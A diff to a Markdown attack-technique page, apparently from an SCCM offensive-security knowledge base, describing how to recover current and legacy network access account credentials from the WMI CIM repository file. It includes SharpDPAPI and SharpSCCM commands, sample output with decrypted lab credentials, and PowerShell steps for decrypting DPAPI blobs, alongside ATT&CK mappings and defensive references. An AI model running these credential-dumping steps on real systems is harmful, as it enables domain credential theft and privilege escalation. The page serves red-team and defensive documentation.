@@ -6,21 +6,22 @@ Dump legacy network access account (NAA) credentials from the CIM Repository
 
 ## ATT&CK TTPs
 - [TA0006 - Credential Access](https://attack.mitre.org/tactics/TA0006/)
-- [Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)
+- [TA0004 - Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)
 - [T1555 - Passwords from Password Stores](https://attack.mitre.org/techniques/T1555/)
-
-
 
 ## Required Privilege / Context
 - Local administrative privileges on the SCCM client
 
-
 ## Summary
-The network access account (NAA) is an account that can be configured on the SCCM site server. The NAA is used  to access and retrieve software from a distribution point but serves no other purpose on the client. The credentials are retrieved by clients as part of the Computer Policy. Once received by the client, the credentials are stored in the `CCM_NetworkAccessAccount` class in the `root\ccm\policy\Machine\ActualConfig` WMI namespace. This can be verified with the following PowerShell one-liner: `Get-WmiObject -namespace "root\ccm\policy\Machine\ActualConfig" -class "CCM_NetworkAccessAccount"`.
+The network access account (NAA) is an account that can be configured on the SCCM site server. The NAA is used  to access and retrieve software from a distribution point but serves no other purpose on the client. The credentials are retrieved by clients as part of the Computer Policy. Once received by the client, the credentials are stored in the `CCM_NetworkAccessAccount` class in the `root\ccm\policy\Machine\ActualConfig` WMI namespace.
 
-Within this class, there exists two members of interest: `NetworkAccessUsername` and `NetworkAccessPassword`, which contain hexidecimal strings of encrypted data. This data is protected via the Data Protection API (DPAPI) and the SYSTEM DPAPI masterkey. Therefore, we must be elevated on the host in order to retrieve the SYSTEM masterkey which can then be used to decrypt the secrets.
+This technique may apply whether an NAA is currently configured ([CREDENTIAL03](../CREDENTIAL03/credential03-description.md)) or not. Therefore, even if [CREDENTIAL03](../CREDENTIAL03/credential03-description.md) is fruitless, there is still hope.
 
-This process is automated in [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI?tab=readme-ov-file#sccm) and [SharpSCCM](https://github.com/Mayyhem/SharpSCCM).
+Data stored within WMI classes exists on disk in the CIM repository file located at `C:\Windows\System32\wbem\Repository\OBJECTS.DATA`. Due to the [nuance](https://github.com/mandiant/flare-wmi/blob/master/python-cim/doc/data-recovery.md) of how WMI and CIM clean up these objects, they may be cleared from the database (as read from a WMI context) but still persist on disk in the CIM repository file.
+
+The credentials exist in the file in the following format: `CCM_NetworkAccessAccount  <PolicySecret Version="1"><![CDATA[0601000001000000D08C9DDF0115D1118C7A00C04FC297EB...`. The file can be searched either manually in a text or hex editor, or automated with [SharpDPAPI's search command](https://github.com/GhostPack/SharpDPAPI?tab=readme-ov-file#search): `SharpDPAPI.exe search /type:file /path:C:\Windows\System32\wbem\Repository\OBJECTS.DATA`.
+
+If an encrypted blob exists, it can be extracted and decrypted using the SYSTEM DPAPI masterkey and [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) or automated with [SharpSCCM](https://github.com/Mayyhem/SharpSCCM)'s `local secrets -m disk` command.
 
 ## Impact
 
@@ -28,22 +29,20 @@ This technique may allow an attacker to retrieve plaintext domain credentials. E
 
 We (SpecterOps) commonly see accounts that are members of the `SCCM Administrators` and `Domain Admins` groups configured as the NAA.
 
+Currently-configured NAAs and/or legacy NAA configurations may be present in the CIM repository file. If so, an attacker can recover legacy accounts that have been configured for NAA in the past. For example, if a system administrator configure their SCCM Admin account as the NAA when the site was created but, years later, fixed their mistake and no longer use an overprivileged NAA or NAA at all, their SCCM Admin credentials may still be on disk on SCCM clients.
+
 ## Examples
 
 ### SharpSCCM
 
 ```
-PS C:\tools\SharpSCCM.exe local secrets -m wmi
+PS C:\tools\> .\SharpSCCM.exe local secrets -m disk
 
   _______ _     _ _______  ______  _____  _______ _______ _______ _______
   |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |    v2.0.1.0
   ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |    @_Mayyhem
 
-[+] Connecting to \\127.0.0.1\root\ccm\policy\Machine\ActualConfig
-
-[+] Retrieving network access account blobs via WMI
-[+] Retrieving task sequence blobs via WMI
-[+] Retrieving collection variable blobs via WMI
+[+] Retrieving secret blobs from CIM repository
 
 [+] Modifying permissions on registry key: SECURITY\Policy\Secrets\DPAPI_SYSTEM\CurrVal\
 [+] Modifying permissions on registry key: SECURITY\Policy\PolEKList
@@ -59,56 +58,28 @@ PS C:\tools\SharpSCCM.exe local secrets -m wmi
     {GUID}:SHA1
     {GUID}:SHA1
 
-[+] Decrypting network access account credentials
+[+] Decrypting 3 network access account secrets
 
     NetworkAccessUsername: APERTURE\networkaccess
     NetworkAccessPassword: SuperSecretPassword
 
-[+] No task sequences were found
-[+] No collection variables were found
+    NetworkAccessUsername: APERTURE\networkaccess
+    NetworkAccessPassword: SuperSecretPassword
 
-[+] Completed execution in 00:00:02.8605620
+    NetworkAccessUsername: APERTURE\networkaccess
+    NetworkAccessPassword: SuperSecretPassword
+
+[+] Completed execution in 00:00:03.4568194
 ```
 
 ### Manual
 
-- Use SharpDPAPI to retrieve SYSTEM masterkey
-- Use PowerShell to retrieve the encrypted secrets
-- Manually parse with PowerShell
+- Retrieve SYSTEM masterkey with SharpDPAPI's `machinetriage` module
+- Enumerate encrypted secrets using SharpDPAPI's `search` module
+- If present, manually extract the blob
+- Manually parse with PowerShell:
 
 ```
-
-PS C:\Users\labadmin\Desktop> Get-WmiObject -namespace "root\ccm\policy\Machine\ActualConfig" -class "CCM_NetworkAccessAccount"
-
-
-__GENUS               : 2
-__CLASS               : CCM_NetworkAccessAccount
-__SUPERCLASS          : CCM_ComponentClientConfig
-__DYNASTY             : CCM_Policy
-__RELPATH             : CCM_NetworkAccessAccount.SiteSettingsKey=1
-__PROPERTY_COUNT      : 8
-__DERIVATION          : {CCM_ComponentClientConfig, CCM_Policy}
-__SERVER              : CLIENT-1
-__NAMESPACE           : ROOT\ccm\policy\Machine\ActualConfig
-__PATH                : \\CLIENT-1\ROOT\ccm\policy\Machine\ActualConfig:CCM_NetworkAccessAccount.SiteSettingsKey=1
-ComponentName         :
-Enabled               :
-NetworkAccessPassword : <PolicySecret Version="1"><![CDATA[0601000001000000D08C9DDF0115D1118C7A00C04FC297EB010000007DCB965EA2D25D458FFA078B7AA1010700000000020000000000106600000001000020000000D8FB66BC9F1E0DCC3
-                        3416AF0FE95594657F4EF386169990ADB82AB21F4600359000000000E80000000020000200000008674CA3CCB29140976E02445A46F0CA748EDBAC0D847AABA911444EAAA4571FA30000000AFDABECB9D275177B6631E6EEE7C472A2
-                        B007768544A408EC45CE5BA94B5DDD9950A9AF814485026A263255C857F3DAF4000000088A3FE3B78029E43339E767845E0367BA98079E27F808472D29975D5486E7E1F37B70FC85D1830ED9EFDFCF3F2310F451C649CE974638278B
-                        60B218E7BAF2DAF]]></PolicySecret>
-NetworkAccessUsername : <PolicySecret Version="1"><![CDATA[0601000001000000D08C9DDF0115D1118C7A00C04FC297EB010000007DCB965EA2D25D458FFA078B7AA1010700000000020000000000106600000001000020000000FBE709999A688F8C9
-                        345B70C1DED0F3D905A21A11A328B624529B0E5B1DB09EC000000000E80000000020000200000006584737680D1A01EFFD4DA3CA38DDE70669225D7F3E8DF6339855F669BF51AEF30000000C0446CFE6977BA5DD77A0B1342B03FE2B
-                        1BFCACABADB2A11B60D8EFFB50689B3629C1A70208E279E50216F7A50C27D95400000008749971D42123C00FF50BED19AEE278ACCB3581F84EA3DD445E4116445FAE507646891E1A17702622CDBF74B03C1F585EC5B4D5838143B8E0
-                        AD83A0DB10A841D]]></PolicySecret>
-Reserved1             :
-Reserved2             :
-Reserved3             :
-SiteSettingsKey       : 1
-PSComputerName        : CLIENT-1
-
-
-
 PS C:\Users\labadmin\Desktop> $str = "0601000001000000D08C9DDF0115D1118C7A00C04FC297EB010000007DCB965EA2D25D458FFA078B7AA1010700000000020000000000106600000001000020000000D8FB66BC9F1E0DCC33416AF0FE95594657F4EF386169990ADB82AB21F4600359000000000E80000000020000200000008674CA3CCB29140976E02445A46F0CA748EDBAC0D847AABA911444EAAA4571FA30000000AFDABECB9D275177B6631E6EEE7C472A2B007768544A408EC45CE5BA94B5DDD9950A9AF814485026A263255C857F3DAF4000000088A3FE3B78029E43339E767845E0367BA98079E27F808472D29975D5486E7E1F37B70FC85D1830ED9EFDFCF3F2310F451C649CE974638278B60B218E7BAF2DAF"
 PS C:\Users\labadmin\Desktop> $bytes = for($i=0; $i -lt $str.Length; $i++) {[byte]::Parse($str.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber); $i++}
 PS C:\Users\labadmin\Desktop> $b64 = [Convert]::ToBase64String($bytes[4..$bytes.Length])
@@ -138,8 +109,11 @@ SharpDPAPI completed in 00:00:00.0397643
 ## Defensive IDs
 - [PROTECT04](../../defense-techniques/PROTECT04/protect04-description.md)
 - [PROTECT05](../../defense-techniques/PROTECT05/protect05-description.md)
+- [PROTECT16](../../defense-techniques/PROTECT16/protect16-description.md)
 
 ## References
 - Duane Michael, The Phantom Credentials of SCCM: Why the NAA Won’t Die, https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9
 - Chris Thompson, SharpSCCCM, https://github.com/Mayyhem/SharpSCCM
-- Will Schroeder, SharpDPAPI, https://github.com/GhostPack/SharpDPAPI?tab=readme-ov-file#sccm
+- Will Schroeder, SharpDPAPI, https://github.com/GhostPack/SharpDPAPI
+- William Ballenthin, FlareWMI, https://github.com/mandiant/flare-wmi
+- William Ballenthin, Matt Graeber, Claudiu Teodorescu, Windows Management Instrumentation (WMI) Offense, Defense, and Forensics, https://www.mandiant.com/sites/default/files/2021-09/wp-windows-management-instrumentation.pdf
